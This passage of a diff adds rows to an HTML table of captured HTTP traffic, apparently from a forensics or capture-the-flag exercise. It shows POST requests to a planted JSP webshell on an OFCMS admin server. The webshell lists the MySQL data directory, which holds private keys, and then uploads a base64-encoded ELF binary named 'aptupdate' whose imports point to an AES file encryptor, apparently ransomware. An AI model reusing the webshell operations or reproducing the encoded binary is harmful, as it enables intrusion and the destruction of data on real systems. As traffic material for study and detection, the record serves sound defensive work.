'196608', 'perm': 'rw-r-----', 'name': '#ib_16384_0.dblwr', 'lastModified': '2024/12/08 02:48:00', 'type': 'file'}, {'size': '27262976', 'perm': 'rw-r-----', 'name': 'mysql.ibd', 'lastModified': '2024/12/08 02:45:59', 'type': 'file'}, {'size': '1112', 'perm': 'rw-r--r--', 'name': 'client-cert.pem', 'lastModified': '2024/12/07 03:06:27', 'type': 'file'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'mysql', 'lastModified': '2024/12/07 03:06:28', 'type': 'directory'}, {'size': '1705', 'perm': 'rw-------', 'name': 'private_key.pem', 'lastModified': '2024/12/07 03:06:28', 'type': 'file'}, {'size': '452', 'perm': 'rw-r--r--', 'name': 'public_key.pem', 'lastModified': '2024/12/07 03:06:28', 'type': 'file'}, {'size': '0', 'perm': 'rw-r--r--', 'name': 'debian-5.7.flag', 'lastModified': '2024/12/07 03:06:31', 'type': 'file'}, {'size': '12582912', 'perm': 'rw-r-----', 'name': 'ibdata1', 'lastModified': '2024/12/08 02:48:00', 'type': 'file'}, {'size': '3454', 'perm': 'rw-r-----', 'name': 'ib_buffer_pool', 'lastModified': '2024/12/07 03:06:35', 'type': 'file'}, {'size': '80', 'perm': 'rw-r-----', 'name': 'binlog.index', 'lastModified': '2024/12/08 02:39:09', 'type': 'file'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': '#innodb_redo', 'lastModified': '2024/12/08 02:39:09', 'type': 'directory'}, {'size': '1112', 'perm': 'rw-r--r--', 'name': 'server-cert.pem', 'lastModified': '2024/12/07 03:06:27', 'type': 'file'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'sys', 'lastModified': '2024/12/07 03:06:28', 'type': 'directory'}, {'size': '180', 'perm': 'rw-r-----', 'name': 'binlog.000001', 'lastModified': '2024/12/07 03:06:33', 'type': 'file'}, {'size': '1705', 'perm': 'rw-------', 'name': 'client-key.pem', 'lastModified': '2024/12/07 03:06:27', 'type': 'file'}, {'size': '16777216', 'perm': 'rw-r-----', 'name': 'undo_001', 'lastModified': '2024/12/08 02:45:57', 'type': 'file'}, {'size': '404', 'perm': 'rw-r-----', 'name': 'binlog.000002', 'lastModified': '2024/12/07 03:06:35', 'type': 'file'}, {'size': '1112', 'perm': 'rw-r--r--', 'name': 'ca.pem', 'lastModified': '2024/12/07 03:06:27', 'type': 'file'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'performance_schema', 'lastModified': '2024/12/07 03:06:27', 'type': 'directory'}, {'size': '16777216', 'perm': 'rw-r-----', 'name': 'undo_002', 'lastModified': '2024/12/08 02:45:28', 'type': 'file'}, {'size': '12582912', 'perm': 'rw-r-----', 'name': 'ibtmp1', 'lastModified': '2024/12/08 02:39:11', 'type': 'file'}, {'size': '884', 'perm': 'rw-r-----', 'name': 'binlog.000004', 'lastModified': '2024/12/08 02:39:09', 'type': 'file'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'ofcms', 'lastModified': '2024/12/08 02:04:02', 'type': 'directory'}, {'size': '565137', 'perm': 'rw-r-----', 'name': 'binlog.000005', 'lastModified': '2024/12/08 02:45:57', 'type': 'file'}, {'size': '4', 'perm': 'rw-r-----', 'name': '8ba8656664fc.pid', 'lastModified': '2024/12/08 02:39:09', 'type': 'file'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'secret', 'lastModified': '2024/12/08 02:30:21', 'type': 'directory'}, {'size': '208460', 'perm': 'rw-r-----', 'name': 'binlog.000003', 'lastModified': '2024/12/08 02:30:20', 'type': 'file'}, {'size': '4', 'perm': 'rw-r-----', 'name': 'c763cdd8b23e.pid', 'lastModified': '2024/12/08 02:30:20', 'type': 'file'}, {'size': '4', 'perm': 'rw-r-----', 'name': '85646785b53d.pid', 'lastModified': '2024/12/08 02:04:01', 'type': 'file'}], 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>26</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '文件操作', 'path': '/var/lib/mysql/', 'mode': 'list'}</td>
+      <td>200</td>
+      <td>{'msg': [{'size': '4096', 'perm': 'rwxr-xr-x', 'name': '.', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': '..', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': '#innodb_temp', 'lastModified': '2024/12/08 02:39:09', 'type': 'directory'}, {'size': '1705', 'perm': 'rw-------', 'name': 'server-key.pem', 'lastModified': '2024/12/07 03:06:27', 'type': 'file'}, {'size': '1705', 'perm': 'rw-------', 'name': 'ca-key.pem', 'lastModified': '2024/12/07 03:06:27', 'type': 'file'}, {'size': '8585216', 'perm': 'rw-r-----', 'name': '#ib_16384_1.dblwr', 'lastModified': '2024/12/07 03:06:26', 'type': 'file'}, {'size': '56', 'perm': 'rw-r-----', 'name': 'auto.cnf', 'lastModified': '2024/12/07 03:06:26', 'type': 'file'}, {'size': '196608', 'perm': 'rw-r-----', 'name': '#ib_16384_0.dblwr', 'lastModified': '2024/12/08 02:48:00', 'type': 'file'}, {'size': '27262976', 'perm': 'rw-r-----', 'name': 'mysql.ibd', 'lastModified': '2024/12/08 02:45:59', 'type': 'file'}, {'size': '1112', 'perm': 'rw-r--r--', 'name': 'client-cert.pem', 'lastModified': '2024/12/07 03:06:27', 'type': 'file'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'mysql', 'lastModified': '2024/12/07 03:06:28', 'type': 'directory'}, {'size': '1705', 'perm': 'rw-------', 'name': 'private_key.pem', 'lastModified': '2024/12/07 03:06:28', 'type': 'file'}, {'size': '452', 'perm': 'rw-r--r--', 'name': 'public_key.pem', 'lastModified': '2024/12/07 03:06:28', 'type': 'file'}, {'size': '0', 'perm': 'rw-r--r--', 'name': 'debian-5.7.flag', 'lastModified': '2024/12/07 03:06:31', 'type': 'file'}, {'size': '12582912', 'perm': 'rw-r-----', 'name': 'ibdata1', 'lastModified': '2024/12/08 02:48:00', 'type': 'file'}, {'size': '3454', 'perm': 'rw-r-----', 'name': 'ib_buffer_pool', 'lastModified': '2024/12/07 03:06:35', 'type': 'file'}, {'size': '80', 'perm': 'rw-r-----', 'name': 'binlog.index', 'lastModified': '2024/12/08 02:39:09', 'type': 'file'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': '#innodb_redo', 'lastModified': '2024/12/08 02:39:09', 'type': 'directory'}, {'size': '1112', 'perm': 'rw-r--r--', 'name': 'server-cert.pem', 'lastModified': '2024/12/07 03:06:27', 'type': 'file'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'sys', 'lastModified': '2024/12/07 03:06:28', 'type': 'directory'}, {'size': '180', 'perm': 'rw-r-----', 'name': 'binlog.000001', 'lastModified': '2024/12/07 03:06:33', 'type': 'file'}, {'size': '1705', 'perm': 'rw-------', 'name': 'client-key.pem', 'lastModified': '2024/12/07 03:06:27', 'type': 'file'}, {'size': '16777216', 'perm': 'rw-r-----', 'name': 'undo_001', 'lastModified': '2024/12/08 02:45:57', 'type': 'file'}, {'size': '404', 'perm': 'rw-r-----', 'name': 'binlog.000002', 'lastModified': '2024/12/07 03:06:35', 'type': 'file'}, {'size': '1112', 'perm': 'rw-r--r--', 'name': 'ca.pem', 'lastModified': '2024/12/07 03:06:27', 'type': 'file'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'performance_schema', 'lastModified': '2024/12/07 03:06:27', 'type': 'directory'}, {'size': '16777216', 'perm': 'rw-r-----', 'name': 'undo_002', 'lastModified': '2024/12/08 02:45:28', 'type': 'file'}, {'size': '12582912', 'perm': 'rw-r-----', 'name': 'ibtmp1', 'lastModified': '2024/12/08 02:39:11', 'type': 'file'}, {'size': '884', 'perm': 'rw-r-----', 'name': 'binlog.000004', 'lastModified': '2024/12/08 02:39:09', 'type': 'file'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'ofcms', 'lastModified': '2024/12/08 02:04:02', 'type': 'directory'}, {'size': '565137', 'perm': 'rw-r-----', 'name': 'binlog.000005', 'lastModified': '2024/12/08 02:45:57', 'type': 'file'}, {'size': '4', 'perm': 'rw-r-----', 'name': '8ba8656664fc.pid', 'lastModified': '2024/12/08 02:39:09', 'type': 'file'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'secret', 'lastModified': '2024/12/08 02:30:21', 'type': 'directory'}, {'size': '208460', 'perm': 'rw-r-----', 'name': 'binlog.000003', 'lastModified': '2024/12/08 02:30:20', 'type': 'file'}, {'size': '4', 'perm': 'rw-r-----', 'name': 'c763cdd8b23e.pid', 'lastModified': '2024/12/08 02:30:20', 'type': 'file'}, {'size': '4', 'perm': 'rw-r-----', 'name': '85646785b53d.pid', 'lastModified': '2024/12/08 02:04:01', 'type': 'file'}], 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>27</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '文件操作', 'path': '/var/lib/mysql/secret/', 'mode': 'list'}</td>
+      <td>200</td>
+      <td>{'msg': [{'size': '4096', 'perm': 'rwxr-xr-x', 'name': '.', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': '..', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '114688', 'perm': 'rw-r-----', 'name': 'secret.ibd', 'lastModified': '2024/12/08 02:39:09', 'type': 'file'}], 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>28</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '文件操作', 'path': '/var/lib/mysql/secret/', 'mode': 'list'}</td>
+      <td>200</td>
+      <td>{'msg': [{'size': '4096', 'perm': 'rwxr-xr-x', 'name': '.', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': '..', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '114688', 'perm': 'rw-r-----', 'name': 'secret.ibd', 'lastModified': '2024/12/08 02:39:09', 'type': 'file'}], 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>29</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '文件操作', 'path': '/var/lib/mysql/secret/aptupdate', 'content': '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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPMPHvpIg+wISIsFyS8AAEiFwHQC/9BIg8QIwwAAAAAA/zUaLwAA8v8lGy8AAA8fAPMPHvpoAAAAAPLp4f///5DzDx76aAEAAADy6dH///+Q8w8e+mgCAAAA8unB////kPMPHvpoAwAAAPLpsf///5DzDx76aAQAAADy6aH///+Q8w8e+mgFAAAA8umR////kPMPHvpoBgAAAPLpgf///5DzDx76aAcAAADy6XH///+Q8w8e+mgIAAAA8ulh////kPMPHvpoCQAAAPLpUf///5DzDx76aAoAAADy6UH///+Q8w8e+mgLAAAA8ukx////kPMPHvpoDAAAAPLpIf///5DzDx76aA0AAADy6RH///+Q8w8e+mgOAAAA8ukB////kPMPHvpoDwAAAPLp8f7//5DzDx76aBAAAADy6eH+//+Q8w8e+vL/JaUuAAAPH0QAAPMPHvry/yX1LQAADx9EAADzDx768v8l7S0AAA8fRAAA8w8e+vL/JeUtAAAPH0QAAPMPHvry/yXdLQAADx9EAADzDx768v8l1S0AAA8fRAAA8w8e+vL/Jc0tAAAPH0QAAPMPHvry/yXFLQAADx9EAADzDx768v8lvS0AAA8fRAAA8w8e+vL/JbUtAAAPH0QAAPMPHvry/yWtLQAADx9EAADzDx768v8lpS0AAA8fRAAA8w8e+vL/JZ0tAAAPH0QAAPMPHvry/yWVLQAADx9EAADzDx768v8ljS0AAA8fRAAA8w8e+vL/JYUtAAAPH0QAAPMPHvry/yV9LQAADx9EAADzDx768v8ldS0AAA8fRAAA8w8e+jHtSYnRXkiJ4kiD5PBQVEUxwDHJSI09lQUAAP8Vcy0AAPRmLg8fhAAAAAAASI09eS0AAEiNBXItAABIOfh0FUiLBTYtAABIhcB0Cf/gDx+AAAAAAMMPH4AAAAAASI09SS0AAEiNNUItAABIKf5IifBIwe4/SMH4A0gBxkjR/nQUSIsF/SwAAEiFwHQI/+BmDx9EAADDDx+AAAAAAPMPHvqAPQUtAAAAdStVSIM92iwAAABIieV0DEiLPeYsAADoGf7//+hk////xgXdLAAAAV3DDx8Aww8fgAAAAADzDx766Xf////zDx76VUiJ5UiB7DABAABIib3Y/v//ZEiLBCUoAAAASIlF+DHASMeF8P7//wAAAABIx4X4/v//AAAAAEjHhQD///8AAAAASMeFCP///wAAAABIx4UQ////AAAAAEjHhRj///8AAAAASMeFIP///wAAAABIx4Uo////AAAAAEjHhTD///8AAAAASMeFOP///wAAAABIx4VA////AAAAAEjHhUj///8AAAAASMeFUP///wAAAABIx4VY////AAAAAEjHhWD///8AAAAASMeFaP///wAAAABIx4Vw////AAAAAEjHhXj///8AAAAASMdFgAAAAABIx0WIAAAAAEjHRZAAAAAASMdFmAAAAABIx0WgAAAAAEjHRagAAAAASMdFsAAAAABIx0W4AAAAAEjHRcAAAAAASMdFyAAAAABIx0XQAAAAAEjHRdgAAAAASMdF4AAAAABIx0XoAAAAAEiNhfD+//++/wAAAEiJx+gI/f//SI2F8P7//0iJx+jp/P//iYXs/v//x4Xo/v//AAAAAOtSi4Xo/v//O4Xs/v//fSeLhej+//9ImA+2lAXw/v//i4Xo/v//SGPISIuF2P7//0gByIgQ6xaLhej+//9IY9BIi4XY/v//SAHQxgAjg4Xo/v//AYO96P7//x9+pZBIi0X4ZEgrBCUoAAAAdAXol/z//8nD8w8e+lVIieVIg+wwSIl92EiLRdhIjRWiCgAASInWSInH6B/8//9IiUXoSIN96AAPhM4AAABIi0XougIAAAC+AAAAAEiJx+jq+///SItF6EiJx+i++///SIlF8EiLRei6AAAAAL4AAAAASInH6MT7//9Ii0XwvgEAAABIicfoI/z//0iJRfhIg334AHUOSItF6EiJx+gc/P//62nHReQAAAAA6z9Ii0XougAAAAC+AAAAAEiJx+h7+///SItV8EiLTehIi0X4vgEAAABIicfoAvz//0iLRehIicfoFvz//4NF5AGDfeQBfrtIi0X4SInH6GD7//9Ii0XoSInH6LT7///rAZDJw/MPHvpVSInlSIHscAEAAEiJvaj+//9IibWg/v//SImVmP7//2RIiwQlKAAAAEiJRfgxwEiLhaj+//9IjRV5CQAASInWSInH6PP6//9IiYXA/v//SIuFoP7//0iNFVwJAABIidZIicfo0/r//0iJhcj+//9Ig73A/v//AHQKSIO9yP7//wB1O0iDvcD+//8AdA9Ii4XA/v//SInH6A/7//9Ig73I/v//AA+E/gAAAEiLhcj+//9Iicfo8vr//+nrAAAASI2V0P7//0iLhZj+//++AAEAAEiJx+gi+///63qLhbz+//+D+A93M7gQAAAAK4W8/v//SGPQuBAAAAArhbz+//+Ljbz+//9IY8lIjXXQSAHxicZIic/o4vn//0iNldD+//9IjXXgSI1F0LkBAAAASInH6Kb6//9Ii5XI/v//SI1F4EiJ0boQAAAAvgEAAABIicfodvr//0iLlcD+//9IjUXQSInRuhAAAAC+AQAAAEiJx+gG+v//iYW8/v//g728/v//AA+PU////0iLhcD+//9IicfoFPr//0iLhcj+//9IicfoBfr//+sBkEiLRfhkSCsEJSgAAAB0BejO+f//ycPzDx76VUiJ5UiB7DABAABkSIsEJSgAAABIiUX4McBIx4XQ/v//AAAAAEjHhdj+//8AAAAASMeF4P7//wAAAABIx4Xo/v//AAAAAEiNhdD+//9Iicfo3Pr//0iNhfD+//9MjQWWBwAASI0VlgcAAEiJ0UiNFa0HAAC+AAEAAEiJx7gAAAAA6NL4//9IjZXQ/v//SI2F8P7//0iJxkiNBWIHAABIicfok/3//0iNBVMHAABIicfofvz//0iNBUQHAABIicfoNPn//7gAAAAASItV+GRIKxQlKAAAAHQF6Ov4///JwwDzDx76SIPsCEiDxAjDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA